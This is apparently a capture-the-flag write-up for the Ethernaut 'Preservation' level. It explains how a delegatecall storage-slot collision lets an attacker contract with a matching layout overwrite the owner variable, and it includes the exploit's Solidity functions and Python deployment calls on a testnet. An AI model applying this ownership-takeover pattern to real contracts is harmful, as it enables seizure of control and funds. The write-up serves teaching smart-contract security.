# Preservation

## Objectives

The goal of this level is for you to claim ownership of the instance you are given.

## Solution

The preservation contract uses the contracts allocated in the addresses `timeZone1Library` and `timeZone2Library` as library contracts. Thus, all calls to these contracts are done through `delegatecall` in the Preservation contract and do NOT touch the storage of each respective `LibraryContract` but rather the storage of the Preservation contract.

When we modify the variable `storedTime` through a `delegatecall` of the `setTime()` function in the library contracts, we are not modifying `storedTime` in neither the library or the Preservation contracts, but rather _the variable occupying the respective storage slot of `storedTime`_ in the Preservation contract.

Therefore, calling either `setFirstTime()` or `setSecondTime()` will modify `timeZone1Library` with whatever value we pass as `_timeStamp`. Therefore, in order to exploit the contract and become `owner`, we need to deploy a contract with the _same storage layout as Preservation_, this means that our attacker contract should define:

```cs
address public timeZone1Library;
address public timeZone2Library;
address public owner; 
```

In the exact same order as Preservation.

Also, there must be two additional functions defined in the attacker contract:

* A function `setTime()` that takes a `uint256` parameter, which will, in the case of the attacker contract, modify the variable in its _3rd memory slot_, so `owner`. The name of this variable is not relevant, since we're only interested in modifying the 3rd memory slot in Preservation, but for consistency's purposes, I also named it `owner`.

```cs
function setTime(uint256) public {
    owner = tx.origin;
}
```

* A function where `setFirstTime()` is called in Preservation in order to make `timeZone1Library` the attacker contract. If each LibraryContract was _correctly coded_ with an identical layout to Preservation, the Preservation contract wouldn't be vulnerable in this way.

```cs
function setFirstTimeExploit() external {
    preservationContract.setFirstTime(uint256(address(this)));
}
```

Where `preservationContract` is an interface to the Preservation contract.

Therefore the flow is as follows:

1. Make `timeZone1Library` the attacker contract address by calling `setFirstTime()` from the attacker contract.

2. Call `setFirstTime()` in the Preservation contract with any unsigned integer as parameter, which executes `setTime()` in the attacker contract making `owner` our origin address.

## How I did it

1. Code and deploy (at: `0x5E51EE439b501d7e39261Df8C437dA19a28F651D`) the attacker contract as described in [solution](#solution)

```python
pattack = PreservationAttack.deploy(preservation.address, _from)
```

2. Call `setFirstTime()` from the attacker contract

```python
pattack.setFirstTimeExploit(_from)
```

Block explorer: https://rinkeby.etherscan.io/tx/0xecb25cbd88e8581ed18dcff2dde1de2eae3e4b52632aa6f6caeafda07f38d943

3. Call `setFirstTime()` from the address I want to make `owner` (my address, in this case, `tx.origin`), though I could have also manually hardcoded the address in the attacker contract.

```python
preservation.setFirstTime(0, _from)
```

Block explorer: https://rinkeby.etherscan.io/tx/0x100300c698f668e8c3d50a439cfd57cfe7f363b7fee1986babaff39aaa2a790a

4. Check that my address is owner

```python
owner_assertion = preservation.owner() == acc.address
print(f"My address is the contract owner {owner_assertion}")
```

### Submission transaction

Block explorer: https://rinkeby.etherscan.io/tx/0x103ddeb1d690d372de65f1ceef96628dd0ea60776cc5cc4ddb5adea323dc4cc3
